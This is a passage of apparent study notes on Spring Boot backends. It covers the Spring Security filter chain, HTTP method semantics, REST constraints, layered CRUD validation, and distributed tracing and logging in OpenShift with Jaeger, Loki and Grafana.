SecurityContextPersistenceFilter
LogoutFilter
UsernamePasswordAuthenticationFilter
BasicAuthenticationFilter
JWTAuthenticationFilter (if configured)
ExceptionTranslationFilter
FilterSecurityInterceptor (authorization)
🟡 Phase 3: Authentication Flow (if needed)
UsernamePasswordAuthenticationFilter → AuthenticationManager → ProviderManager → Providers:
DaoAuthenticationProvider
JwtAuthenticationProvider
LdapAuthenticationProvider
Authentication result stored in SecurityContext.
🟣 Phase 4: DispatcherServlet + MVC
HandlerMapping selects Controller
Interceptors run (preHandle)
Controller executes
Controller calls Service → Repository → DB

Response modification	Add custom headers


## HTTP Methods
1️⃣ GET – Retrieve Data

GET is used to fetch data from the server.

Changes server state	❌ No
Idempotent	✅ Yes
Safe	✅ Yes

If you run it 100 times, nothing changes.

It does not modify anything in the database.
2️⃣ POST – Create Resource

POST is used to create a new resource.

Each request may create a new record.

Changes server state	✅ Yes
Idempotent	❌ No
Safe	❌ No
If you send the request 3 times, 3 users may be created.
3️⃣ PUT – Replace Resource

PUT replaces the entire resource.

Changes server state	✅ Yes
Idempotent	✅ Yes

Multiple requests → same final state.

4️⃣ PATCH – Partial Update

PATCH updates only specific fields.

Changes server state	✅ Yes
Idempotent	❌ Usually

5️⃣ DELETE – Remove Resource

DELETE removes a resource from the server.

Changes server state	✅ Yes
Idempotent	✅ Yes
Running it multiple times still results in:

User does not exist

So the final state remains the same.

## REST Features
(Representational State Transfer) is an architectural style used to design scalable and simple web services. REST APIs follow certain principles or features (constraints) that make them efficient.

The main features of REST are the following:

1️⃣ Client–Server Architecture

In REST, the client and server are separate.

Client → sends request (browser, mobile app, frontend)

Server → processes request and sends response

Example

Frontend (React / Angular)

GET /users/10

Backend (Spring Boot)

returns user data
Benefit

Independent development

Frontend and backend can evolve separately

2️⃣ Stateless

REST APIs are stateless, meaning:

The server does not store any client session between requests.

Every request must contain all necessary information.

Example

Request:

GET /orders
Authorization: Bearer token123

Next request must again include authentication.

Server does not remember previous requests.

Benefits

Easy scalability

Load balancers work easily

No session management needed

3️⃣ Cacheable

REST responses can be cached to improve performance.

Example:

GET /products
Cache-Control: max-age=3600

This means the response can be cached for 1 hour.

Benefit

Faster responses

Reduced server load

4️⃣ Uniform Interface

REST APIs follow a standard interface to interact with resources.

Main principles:

Resource-based URLs

/users
/orders
/products

Standard HTTP methods

Method	Operation
GET	Retrieve
POST	Create
PUT	Update
PATCH	Partial update
DELETE	Remove

Standard response formats

Usually:

JSON
XML

Example response:

{
 "id": 1,
 "name": "Priyanka"
}
5️⃣ Layered System

REST architecture can have multiple layers between client and server.

Example layers:

Client
   ↓
API Gateway
   ↓
Authentication Service
   ↓
Microservice
   ↓
Database

Client does not know how many layers exist.

Benefits

Security

Scalability

Load balancing

6️⃣ Code on Demand (Optional)

Server can send executable code to the client.

Example:

JavaScript

Applets

Example:

Server sends JavaScript code to browser.

This feature is optional and rarely used in APIs.
## CRUD operations Validations
CRUD operations are validated at multiple levels, including input validation using annotations like @Valid, business logic validation in the service layer, authorization checks, and database constraints such as primary key, unique, and foreign key validations.


1️⃣ Input Validation (Most Important)

Before processing CRUD operations, we must validate the input data.

Example: Creating a user

POST /users

Request:

{
 "name": "",
 "email": "invalid-email"
}

We must validate:

Name should not be empty

Email should be valid

In Spring Boot

Use Bean Validation (JSR-380) annotations.
```
public class UserDTO {

    @NotBlank
    private String name;

    @Email
    private String email;

    @Min(18)
    private int age;
}```

Controller:
```
@PostMapping("/users")
public ResponseEntity<User> createUser(@Valid @RequestBody UserDTO user) {
    return ResponseEntity.ok(userService.create(user));
}```

If validation fails → 400 Bad Request.

2️⃣ Business Validation

Even if input format is correct, we must validate business rules.

Example rules:

Email must be unique

Account balance cannot be negative

User must exist before updating

Example:
```
if(userRepository.existsByEmail(user.getEmail())) {
    throw new DuplicateEmailException("Email already exists");
}
```
3️⃣ Database Constraints

Database also validates data to maintain data integrity.

Examples:

Constraint	Purpose
Primary Key	Unique row identifier
Unique	No duplicate values
Foreign Key	Maintain relationships
Check	Validate column values

Example:

email VARCHAR(255) UNIQUE

If duplicate email is inserted → database rejects it.

4️⃣ Authorization Validation

Before CRUD operations, check whether the user has permission.

Example:
```
@PreAuthorize("hasRole('ADMIN')")
@DeleteMapping("/users/{id}")
```

Only ADMIN can delete users.

5️⃣ Resource Existence Validation

Before update or delete, check if resource exists.

Example:
```
User user = userRepository.findById(id)
        .orElseThrow(() -> new ResourceNotFoundException("User not found"));
```

Otherwise return:

404 Not Found
6️⃣ Data Format Validation

Validate fields like:

Email

Phone number

Date format

Example:

@Pattern(regexp="^[0-9]{10}$")
private String phoneNumber;
7️⃣ API-Level Validation

Validate request parameters.

Example:

GET /users?page=-1

Invalid page number → reject request.

**Example CRUD Validation Flow** 

Client Request
      ↓
Controller
      ↓
Input Validation (@Valid)
      ↓
Business Validation
      ↓
Authorization Check
      ↓
Database Constraints
      ↓
Save/Update/Delete
Example: Full Create Validation (Spring Boot)
```
@PostMapping("/users")
public ResponseEntity<User> createUser(@Valid @RequestBody UserDTO dto) {

    if(userRepository.existsByEmail(dto.getEmail())) {
        throw new RuntimeException("Email already exists");
    }

    User user = new User();
    user.setName(dto.getName());
    user.setEmail(dto.getEmail());

    return ResponseEntity.ok(userRepository.save(user));
}
```

##  Service Failure Tracing
1️⃣ Distributed Tracing in OpenShift

Use:

OpenTelemetry + Jaeger

Architecture:

Microservices
     ↓
OpenTelemetry instrumentation
     ↓
Jaeger Collector
     ↓
Jaeger Storage
     ↓
Jaeger UI
Tools Used
Tool	Purpose
OpenTelemetry	Generates Trace ID & Span ID
Jaeger	Collects traces
Jaeger UI	Visualizes request flow

Example trace visualization:

Gateway
  ↓
UserService
  ↓
OrderService
  ↓
PaymentService ❌

**Jaeger UI shows:**

a)Trace ID

b)service call chain

c)latency

d)failure points

OpenShift provides Jaeger Operator to install it.

2️⃣ Centralized Logging in OpenShift

Use:

Vector + Loki + Grafana

Architecture:

Pods (Microservices)
        ↓
Vector (log collector)
        ↓
Loki (log storage)
        ↓
Grafana (log visualization)
**Tools  	Used**
Tool		Purpose
Vector		Collect logs from pods
Loki		Store logs
Grafana		Search and visualize logs

OpenShift provides this through:

Red Hat OpenShift Logging Operator

3️⃣ Complete Observability Architecture in OpenShift

                     Microservices
                          │
        ┌─────────────────┼─────────────────┐
        │                 │                 │
     Tracing            Logging           Metrics
        │                 │                 │
 OpenTelemetry          Vector         Prometheus
        │                 │                 │
      Jaeger             Loki            Storage
        │                 │                 │
     Jaeger UI           Grafana          Grafana
	 
4️⃣ Example Debugging Flow

Request fails.

Trace ID:

traceId = 7fa3c21b
Step 1 — Check Jaeger UI

Trace shows:

Gateway → UserService → OrderService → PaymentService ❌
Step 2 — Check Grafana Logs

Search:

traceId=7fa3c21b

Logs show:

PaymentService - Payment gateway timeout

Issue identified.
